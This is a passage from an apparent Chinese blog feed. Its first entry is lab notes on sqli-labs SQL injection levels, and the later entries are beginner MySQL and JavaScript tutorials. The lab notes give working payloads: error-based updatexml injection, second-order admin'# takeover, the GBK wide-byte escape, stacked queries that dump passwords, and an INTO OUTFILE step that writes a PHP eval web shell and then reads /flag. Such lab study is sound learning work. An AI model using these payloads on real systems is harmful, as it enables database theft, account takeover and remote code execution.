title="报错注入："></a>报错注入：</h4><p>报错注入要求前面的条件是真的</p><p>当输入正确无回显，输入语法错误有回显时，可以使用报错注入</p><h4 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h4><p>报错注入要求前面的条件是真的</p><p>当输入正确无回显，输入语法错误无回显，输入语义错误有回显，可以使用布尔盲注</p><h4 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h4><p>要求与布尔盲注一致</p><p>当无论怎样都无回显时，可以使用时间盲注</p><h3 id="Less-18-Less-19"><a href="#Less-18-Less-19" class="headerlink" title="Less-18 Less-19"></a>Less-18 Less-19</h3><p>tip：其实一直忘了说一件事，正确账号和密码都是<strong>admin</strong>，另外，本次是UA注入</p><p>本处以Less-18为主，Less-19把UA换成Referer</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>经过测试可知：语义错误无回显，语法错误无回显，登入成功回显UA</p><p>猜测此处存在UA注入</p><p>但是此处又有一个细节，如果账户和密码不正确，将会不回显UA</p><h4 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式"></a>闭合方式</h4><p>对UA操作：</p><p>1无回显</p><p>1’报错</p><p>1“无回显</p><p>1)无回显</p><p>很明显，就是单引号闭合</p><h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4><p>单引号闭合，利用报错注入，例子：</p><p>（经过多次尝试，格式严格等于）</p><p><code>1&#39;=&#39;1&#39; and updatexml(1,concat(0x7e,database()),1)  and &#39;1&#39;=&#39;1</code> </p><p>剩下照旧</p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>tip：经过多次抓包，发现每次都会发送两个包，一个GET，一个POST。本次是cookie注入，有关的是GET包</p><p>还能咋样嘞，学习Less-18</p><h3 id="小结-包注入"><a href="#小结-包注入" class="headerlink" title="小结(包注入)"></a>小结(包注入)</h3><p>简单的很，猜结构（其实不简单，但是我可以看source）</p><p>information_schema,normal </p><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>二次注入</p><p>查看登录页source，发现两个参数都经过mysql_real_escape_string()函数过滤，那么就不能进行正常注入。</p><p>创建账户成功后，发现可以改密码。我们想夺取admin。</p><p>创建用户名：admin’#，在修改密码时会执行该用户名，然后admin密码就被修改了。</p><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>必须要单引号留存，特定函数(如addslashes())会给单引号前面加一个反斜杠使单引号不能发挥作用。</p><p>爆库：</p><p>?id&#x3D;%df ‘ union select 1,database(),3 –+ </p><p>剩下如旧</p><p>原理</p><p>%df ‘ &#x3D;&gt; %df&#x2F; ‘  &#x3D;&gt; %df%5C%27，由于GBK会把%df%5C一起解码，所以%27成功变回单引号，实现逃逸。</p><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>堆叠注入</p><p>发现本题只能回显第一条语句，不能回显第二条语句。那只有把第二条语句的结果注入到第一条语句。</p><p>爆库：<code>?id=1&#39;;update users set password=(mid((select group_concat(schema_name) from information_schema.schemata),1,20)) where username=&#39;Dumb&#39;; --+</code> </p><p>爆表：<code>?id=1&#39;;update users set password=(mid((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1,20)) where username=&#39;Dumb&#39;; --+</code> </p><p>爆列：<code>?id=1&#39;;update users set password=(mid((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),1,20)) where username=&#39;Dumb&#39;; --+</code> </p><p>爆值：<code>?id=1&#39;;update users set password=(mid((select group_concat(id,password) from users),1,20)) where username=&#39;Dumb&#39;; --+</code> </p><h2 id="SQL注入进阶学习"><a href="#SQL注入进阶学习" class="headerlink" title="SQL注入进阶学习"></a>SQL注入进阶学习</h2><h3 id="注入木马"><a href="#注入木马" class="headerlink" title="注入木马"></a>注入木马</h3><p>第一步<br><code>id=-1 union select 1,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;,3 into OUTFILE &#39;/var/www/html/name.php&#39; --+</code> </p><p>第二步<br>url&#x2F;name.php<br>POST:<br>cmd&#x3D;system(“cat &#x2F;flag”);</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL入门</title>
      <link href="/2024/03/18/MYSQL%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/MYSQL%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="MySQL入门"><a href="#MySQL入门" class="headerlink" title="MySQL入门"></a>MySQL入门</h1><p>要学习，先开机：<code>mysql -u root -r</code></p><p>你还得学会选择数据库：<code>use database_name;</code></p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>每一行(Record)，称为记录</p><p>每一列(Column)，称为字段</p><blockquote><p>字段定义了数据类型（整型、浮点型、字符串、日期等），以及是否允许为<code>NULL</code>。注意<code>NULL</code>表示字段数据不存在。一个整型字段如果为<code>NULL</code>不表示它的值为<code>0</code>，同样的，一个字符串型字段为<code>NULL</code>也不表示它的值为空串<code>&#39;&#39;</code>。</p></blockquote><p>正常，概念不同。另外，字段尽量不要使用NULL，优势：简化查询条件，加快查询速度，也利于应用程序读取数据后无需判断是否为NULL。</p><p>主键是记录的唯一标识。主键是必要的。主键有大概有以下几种：</p><blockquote><ul><li>自增整数主键</li><li>全局唯一GUID类型：使用一种全局唯一的字符串作为主键，类似<code>8f55d96b-8acc-4636-8cb8-76bf8abc2f57</code>。GUID算法通过网卡MAC地址、时间戳和随机数保证任意计算机在任意时间生成的字符串都是不同的，大部分编程语言都内置了GUID算法，可以自己预算出主键。</li></ul></blockquote><p>联合主键允许多个列联合为主键，某一列可以有相同字段，只要所有字段不全部相同即可。</p><p>小结：</p><blockquote><p>主键是关系表中记录的唯一标识。主键的选取非常重要：主键不要带有业务含义，而应该使用BIGINT自增或者GUID类型。主键也不应该允许<code>NULL</code>。</p><p>可以使用多个列作为联合主键，但联合主键并不常用。</p></blockquote><p>外键是多个表之间的键，可以一对一，一对多，多对多</p><p>须知：</p><blockquote><p>外键并不是通过列名实现的，而是通过定义外键约束实现的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE students</span><br><span class="line">ADD CONSTRAINT fk_class_id</span><br><span class="line">FOREIGN KEY (class_id)</span><br><span class="line">REFERENCES classes (id);</span><br></pre></td></tr></table></figure><p>其中，外键约束的名称<code>fk_class_id</code>可以任意，<code>FOREIGN KEY (class_id)</code>指定了<code>class_id</code>作为外键，<code>REFERENCES classes (id)</code>指定了这个外键将关联到<code>classes</code>表的<code>id</code>列（即<code>classes</code>表的主键）。</p></blockquote><p>索引可以优化查询。</p><h2 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h2><h3 id="添加载体"><a href="#添加载体" class="headerlink" title="添加载体"></a>添加载体</h3><p>建立数据库：</p><p>create database database_name;</p><p>附：配套：<code>use database_name;</code></p><p>建立表：来个例子</p><p>create table test1 (<br>    id int not null auto_increment,<br>     name varchar(100) not null,<br>     age bigint not null,<br>     primary key(id) )<br>    default charset&#x3D;utf8;</p><h3 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h3><p>语法(允许全新添加)：</p><p><code>insert into table_name (name1, name2, name3) values (value1,value2,value3);</code></p><p>须知：如果值是字符类的，需要加引号。</p><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><h3 id="查询载体"><a href="#查询载体" class="headerlink" title="查询载体"></a>查询载体</h3><p>查询数据库：</p><p><code>show databases;</code></p><p>查询所有表：</p><p><code>show tables;</code></p><p>查看一个表的结构：</p><p><code>desc table_name;</code></p><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><h4 id="查询逻辑"><a href="#查询逻辑" class="headerlink" title="查询逻辑"></a>查询逻辑</h4><p>语法结构：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">······</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">······</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">······</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">······</span><br><span class="line"><span class="keyword">having</span></span><br><span class="line">······</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line">······</span><br></pre></td></tr></table></figure><p>查询逻辑：</p><ol><li>from 从某张表中查询数据</li><li>where 先经过where条件筛选出有价值的数据</li><li>groub by 对这些有价值的数据进行分组</li><li>having 分组之后可以使用having继续筛选</li><li>select select查询出来</li><li>order by 最后排序输出</li></ol><h3 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h3><p><a href="https://wsygdsgg.github.io/2023/10/28/MySQL/">我的技术与生活——MySQL | 春风少年郎的博客 (wsygdsgg.github.io)</a></p><p>以下只说一些</p><h4 id="1-模糊查询"><a href="#1-模糊查询" class="headerlink" title="1.模糊查询"></a>1.模糊查询</h4><blockquote><p>% 匹配多个字符(以下先代码后解释)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">name</span> <span class="keyword">from</span> <span class="type">name</span>(表名) <span class="keyword">where</span> name1 <span class="keyword">like</span> <span class="string">&#x27;%o%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>找到名字里含有%o%的</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">name</span> <span class="keyword">from</span> <span class="type">name</span>(表名) <span class="keyword">where</span> name1 <span class="keyword">like</span> <span class="string">&#x27;o%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>找到名字里以o开头的</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">name</span> <span class="keyword">from</span> <span class="type">name</span>(表名) <span class="keyword">where</span> name1 <span class="keyword">like</span> <span class="string">&#x27;%o&#x27;</span>;</span><br></pre></td></tr></table></figure><p>找到名字里以o结尾的</p><p>_ 匹配单个字符(以下先代码后解释)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="type">name</span>(表名) <span class="keyword">where</span> name1 <span class="keyword">like</span> <span class="string">&#x27;_A%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>找到第二个字母是A的</p><p>如果前面有n个字符，便在A前面输入n个下划线</p><p>转义</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="type">name</span>(表名) <span class="keyword">where</span> name1 <span class="keyword">like</span> <span class="string">&#x27;% \ _%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>真实输入中%与\与_之间没有空格，本处为了显示 \ 故做特殊处理</p><p>% 和 \ 有特殊含义，为了正常显示下划线，采用转义方法，该处与C语言类似</p></blockquote><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><h3 id="删除载体"><a href="#删除载体" class="headerlink" title="删除载体"></a>删除载体</h3><p>删除数据库：</p><p><code>drop database if exists database_name;</code></p><p>简化：<code>drop database database_name</code></p><p>删除表：</p><p><code>drop table if exists table_name;</code></p><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><p>语法：</p><p><code>delete from table_name where ···;</code></p><p>须知：本句的核心是<strong>where</strong>，具有很灵活的特性。</p><h2 id="改变"><a href="#改变" class="headerlink" title="改变"></a>改变</h2><h3 id="改变载体"><a href="#改变载体" class="headerlink" title="改变载体"></a>改变载体</h3><p>只有数据表的操作</p><p>改表名：</p><p><code>alter table table_name rename to table_new_name;</code></p><p>添加一列：</p><p><code>alter table table_name add column_name type(数据类型);</code></p><p>删除一列：</p><p><code>alter table table_name drop column_name;</code></p><p>修改列名称：</p><p><code>alter table table_name change column_name column_new_name type;</code></p><h3 id="改变数据"><a href="#改变数据" class="headerlink" title="改变数据"></a>改变数据</h3><p>语法：</p><p><code>update table_name set name1=value1, name2=value2, name3=value3 where ···;</code></p><p>须知：核心依然在where。</p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScipt入门</title>
      <link href="/2024/03/18/JavaScipt%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/JavaScipt%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="JavaScript简介"><a href="#JavaScript简介" class="headerlink" title="JavaScript简介"></a>JavaScript简介</h2><ul><li>JavaScript代码需要在<code>&lt;script&gt;</code>标签中写入</li><li>JavaScript代码可以在<code>&lt;head&gt;，&lt;body&gt;</code>以及外部文件中写入</li></ul><h2 id="JavaScript基础四用法："><a href="#JavaScript基础四用法：" class="headerlink" title="JavaScript基础四用法："></a>JavaScript基础四用法：</h2><ul><li>使用 <strong>window.alert()</strong> 弹出警告框。</li><li>使用 <strong>document.write()</strong> 方法将内容写到 HTML 文档中。</li><li>使用 <strong>innerHTML</strong> 写入到 HTML 元素。</li><li>使用 <strong>console.log()</strong> 写入到浏览器的控制台。</li></ul><p>1.window.alert()</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;script&gt;</span></span><br><span class="line"><span class="attribute">window</span>.alert(<span class="number">5</span> + <span class="number">6</span>);</span><br><span class="line"><span class="section">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>2.document.write</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable constant_">HELLO</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.innerHTML</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pq&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;is a handsome!&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4.console.log()</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;script&gt;</span></span><br><span class="line">   <span class="attribute">console</span>.log(<span class="number">3</span> + <span class="number">4</span>);</span><br><span class="line"><span class="section">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="JavaScript入门"><a href="#JavaScript入门" class="headerlink" title="JavaScript入门"></a>JavaScript入门</h2><h3 id="字面量和变量概述"><a href="#字面量和变量概述" class="headerlink" title="字面量和变量概述"></a>字面量和变量概述</h3><h4 id="字面量概述："><a href="#字面量概述：" class="headerlink" title="字面量概述："></a>字面量概述：</h4><p>在编程语言中，一般固定值称为字面量，如 3.14。数字，字符串，表达式，数组，对象，函数都可以作为字面量</p><h4 id="变量概述："><a href="#变量概述：" class="headerlink" title="变量概述："></a>变量概述：</h4><ul><li>需要声明变量，用var声明，不需要声明数据类型，允许一个var声明多个变量</li><li>Value &#x3D; undefined，在计算机程序中，经常会声明无值的变量。未使用值来声明的变量，其值实际上是 undefined</li><li>重新声明 JavaScript 变量不会丢失原来的值</li><li>变量值可以如python一样，直接转换值类型</li></ul><h5 id="变量类型："><a href="#变量类型：" class="headerlink" title="变量类型："></a>变量类型：</h5><p>**值类型(基本类型)**：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol。</p><p><strong>引用数据类型（对象类型）</strong>：对象(Object)、数组(Array)、函数(Function)，还有两个特殊的对象：正则（RegExp）和日期（Date）。</p><h5 id="声明须知："><a href="#声明须知：" class="headerlink" title="声明须知："></a>声明须知：</h5><p>字符串赋值不在意单或双引号</p><p>声明数组：var car&#x3D;new Arroy(‘a’, ‘b’, ‘c’).;下标从0开始</p><p>或者：var cars&#x3D;[“Saab”,”Volvo”,”BMW”];</p><p>声明布尔：var x&#x3D;true; var y&#x3D;false;</p><p>声明对象：var person&#x3D;{firstname:”John”, lastname:”Doe”, id:5566};</p><p>Undefined 和 Null：Undefined 这个值表示变量不含有值，可以通过将变量的值设置为 null 来清空变量。</p><p>对象须知：</p><p>访问对象属性的两种方式：A.a 或 A[‘a’]。</p><p>对象方法：A.a()</p><h3 id="JavaScript函数"><a href="#JavaScript函数" class="headerlink" title="JavaScript函数"></a>JavaScript函数</h3><p>函数是由事件驱动的或者当它被调用时执行的可重复使用的代码块。</p><p>JavaScript函数名对大小写敏感。格式如下：</p><p><code>function myFunction(***var1***,***var2***)</code><br><code>&#123;</code><br><code>*代码*</code><br><code>&#125;</code></p><p>一个简单的文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>GRAAMMER<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;pq()&quot;</span>&gt;</span>点这里<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">pq</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;HELLO&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="JavaScript对象"><a href="#JavaScript对象" class="headerlink" title="JavaScript对象"></a>JavaScript对象</h3><h4 id="创建对象（介绍两种方法）"><a href="#创建对象（介绍两种方法）" class="headerlink" title="创建对象（介绍两种方法）"></a>创建对象（介绍两种方法）</h4><h5 id="对象字面量："><a href="#对象字面量：" class="headerlink" title="对象字面量："></a>对象字面量：</h5><p><code>var object &#123;</code></p><p><code>name = pq;</code></p><p><code>age = 100;</code></p><p><code>&#125;</code></p><h5 id="使用构造函数："><a href="#使用构造函数：" class="headerlink" title="使用构造函数："></a>使用构造函数：</h5><p><code>function person(name, age) &#123;</code></p><p><code>this.name = name;</code></p><p><code>this.age = age;</code></p><p><code>&#125;</code> </p><p><code>ver son = new person(pq, 19);</code></p><h4 id="对象属性和方法"><a href="#对象属性和方法" class="headerlink" title="对象属性和方法"></a>对象属性和方法</h4><blockquote><p>属性是对象中名称和值之间的关联，并且可以包含任何数据类型。</p><p>属性通常是指对象的特征。</p></blockquote><blockquote><p>方法是作为对象属性值的函数，因此是对象可以执行的任务。</p><p>方法存储在属性中作为<strong>函数定义</strong>。</p></blockquote><h4 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a><strong>this</strong>关键字</h4><p>this关键字是指代码被写入内部当前对象-所以在这种情况下，this等同于<strong>user</strong>。</p><h4 id="new关键字"><a href="#new关键字" class="headerlink" title="new关键字"></a>new关键字</h4><p>当使用关键字声明JavaScript变量时，new关键字会使变量作为对象创建。</p><h3 id="JavaScript语句"><a href="#JavaScript语句" class="headerlink" title="JavaScript语句"></a>JavaScript语句</h3><h4 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h4><h5 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h5><p>if 语句与C语言近乎一致，给一个模板即可：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">var</span> a = <span class="number">10</span>, b = <span class="number">20</span>, c = <span class="number">30</span>;</span><br><span class="line"><span class="attribute">var</span> answer;</span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span> (a &gt; b) &#123;</span><br><span class="line">   <span class="attribute">if</span> (a &gt; c) &#123;</span><br><span class="line">  <span class="attribute">answer</span> = <span class="string">&quot;A 是三个中最大的&quot;</span>;</span><br><span class="line">   &#125; <span class="section">else</span> &#123;</span><br><span class="line">  <span class="attribute">answer</span> = <span class="string">&quot;C 是三个中最大的&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="attribute">else</span> if (b &gt; c) &#123;</span><br><span class="line">   <span class="attribute">answer</span> = <span class="string">&quot;B 是三个中最大的&quot;</span>;</span><br><span class="line">&#125; <span class="section">else</span> &#123;</span><br><span class="line">   <span class="attribute">answer</span> = <span class="string">&quot;C 是三个中最大的&quot;</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者使用：condition ? A : B</p><p>当条件为true时进行A语句，否则进行B语句。</p><h5 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h5><p>switch 语句与C语言近乎一致，给一个模板即可：</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">var <span class="built_in">day</span>;</span><br><span class="line"><span class="title function_">switch</span> (<span class="keyword">new </span><span class="class title_">Date</span>().<span class="property">getDay</span>()) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line"> <span class="built_in">day</span> = <span class="string">&quot;Sunday&quot;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line"> <span class="built_in">day</span> = <span class="string">&quot;Monday&quot;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: </span><br><span class="line"> <span class="built_in">day</span> = <span class="string">&quot;Tuesday&quot;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: </span><br><span class="line"> <span class="built_in">day</span> = <span class="string">&quot;Wednesday&quot;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: </span><br><span class="line"> <span class="built_in">day</span> = <span class="string">&quot;Thursday&quot;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: </span><br><span class="line"> <span class="built_in">day</span> = <span class="string">&quot;Friday&quot;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: </span><br><span class="line"> <span class="built_in">day</span> = <span class="string">&quot;Saturday&quot;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>: </span><br><span class="line"> <span class="built_in">day</span> = <span class="string">&quot;Undefined Day&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同C语言一样，break与default必不可少。</p><h4 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h4><h5 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h5><p>大体上与C语言一致</p><h6 id="for-…in"><a href="#for-…in" class="headerlink" title="for …in"></a>for …in</h6><p>for…in循环迭代的对象的属性。</p><p>for(let i in objects) {</p><p>document.write(i);</p><p>}</p><h6 id="for-…of"><a href="#for-…of" class="headerlink" title="for …of"></a>for …of</h6><h6 id="二者区别"><a href="#二者区别" class="headerlink" title="二者区别"></a>二者区别</h6><p><code>for...in</code> 主要用于遍历对象的属性（键名），而 <code>for...of</code> 主要用于遍历可迭代对象的属性值。在处理数组等可迭代对象时，<code>for...of</code> 更常用，而在遍历对象属性时，<code>for...in</code> 更合适。</p><h5 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h5><p>大体上与C语言一致</p><h2 id="JavaScript变量"><a href="#JavaScript变量" class="headerlink" title="JavaScript变量"></a>JavaScript变量</h2><h3 id="JavaScript字符串及方法"><a href="#JavaScript字符串及方法" class="headerlink" title="JavaScript字符串及方法"></a>JavaScript字符串及方法</h3><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><ul><li>字符串对引号类型不做要求，但是必须保证引号不能提前闭合</li><li>字符串之间用加号连接</li></ul><h5 id="语法：如下："><a href="#语法：如下：" class="headerlink" title="**${}**语法：如下："></a>**${}**语法：如下：</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str1 = <span class="string">&quot;quick brown fox&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> str2 = <span class="string">&quot;over the lazy dog&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str3 = <span class="string">`The <span class="subst">$&#123;str1&#125;</span> jumps <span class="subst">$&#123;str2&#125;</span>.`</span>;</span><br></pre></td></tr></table></figure><ul><li>字符串转义序列：在JavaScript中，我们通过在字符\前面加上反斜杠()来实现此目的。</li><li>长代码换行用 <strong>+</strong> 号</li></ul><h5 id="字符串基元和字符串对象"><a href="#字符串基元和字符串对象" class="headerlink" title="字符串基元和字符串对象"></a>字符串基元和字符串对象</h5><p>var pq &#x3D; ‘man’;</p><p>var pq &#x3D; new String(man); </p><p>二者弱等于，且无法比较</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ul><li><p>str.length：返回字符串长度</p></li><li><p>str.concat(ex)：拼接ex到str后面</p></li><li><p>str.ToupperCase()（TolowerCase）：转为大（小）写</p></li><li><p>str.indexof(ex, 